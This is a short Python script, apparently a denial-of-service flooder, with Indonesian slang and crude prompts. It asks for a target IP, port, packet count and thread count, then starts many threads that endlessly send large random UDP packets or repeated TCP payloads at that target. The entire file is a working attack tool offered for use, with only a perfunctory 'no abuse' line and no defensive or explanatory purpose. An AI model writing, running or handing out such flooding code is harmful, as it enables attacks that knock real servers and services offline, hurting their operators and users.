import random
import socket
import threading
import os

os.system("clear")
print ("FUCK MEN")
print ("NO ABUSE BANG")
print ("KALO ABUSE GUA DELETE BANG")
print ("PAS UDAH PORT KALIAN KETIK Gas")
ip = str(input("Ip Nya Meki:"))
port = int(input("Port Nya Cok:"))
choice = str(input("Gass Kah Bang?(Gas/Tidak):"))
times = int(input("Paket Nya:"))
threads = int(input("Bayar Nya:"))
os.system("clear")
def memek():
	data = random._urandom(10021)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KENDOS KAN!!!")
		except:
			print("[!] KENDOS BANG CLOSE IN!!!")

def memek2():
	data = random._urandom(121)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KENDOS KAN!!!")
		except:
			s.close()
			print("[*] KENDOS BANG CLOSE IN")

for y in range(threads):
	if choice == 'Gas':
		th = threading.Thread(target = memek)
		th.start()
	else:
		th = threading.Thread(target = memek2)
		th.start()